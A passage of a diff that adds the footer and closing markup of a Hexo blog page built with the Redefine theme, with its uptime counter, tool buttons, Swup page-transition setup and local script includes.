+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
